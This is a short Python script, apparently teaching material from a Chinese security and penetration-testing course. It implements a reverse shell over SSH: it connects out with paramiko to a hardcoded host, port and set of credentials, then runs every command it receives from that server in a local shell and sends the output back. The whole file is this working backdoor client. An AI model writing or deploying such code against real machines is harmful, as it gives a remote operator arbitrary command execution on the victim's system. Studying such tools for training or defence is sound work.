#!/usr/local/bin/python3
# -*- coding=utf-8 -*-
#本脚由亁颐堂现任明教教主编写，用于乾颐盾Python课程！
#教主QQ:605658506
#亁颐堂官网www.qytang.com
#乾颐盾是由亁颐堂现任明教教主开发的综合性安全课程
#包括传统网络安全（防火墙，IPS...）与Python语言和黑客渗透课程！

import threading
import paramiko
import subprocess
from io import StringIO

def ssh_command(ip, user, passwd, command, port):
    client = paramiko.SSHClient()
    client.load_system_host_keys()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    client.connect(ip,port=port,username=user,password=passwd,timeout=5,compress=True)
    ssh_session = client.get_transport().open_session()
    if ssh_session.active:
        ssh_session.send(command)
        print(ssh_session.recv(1024))
        while True:
            command = ssh_session.recv(1024)
            try:#等到服务器的命令，执行命令，并且发送结果给服务器！
                cmd_output = subprocess.check_output(command,shell=True)
                ssh_session.send(cmd_output)
            except OSError:
                break
            except Exception as e:
                ssh_session.send('命令错误！')
        client.close()
    return

if __name__ == '__main__':
    ssh_command('202.100.1.224', 'qytanguser', 'qytangccies', 'ClientConnected!', 6868)
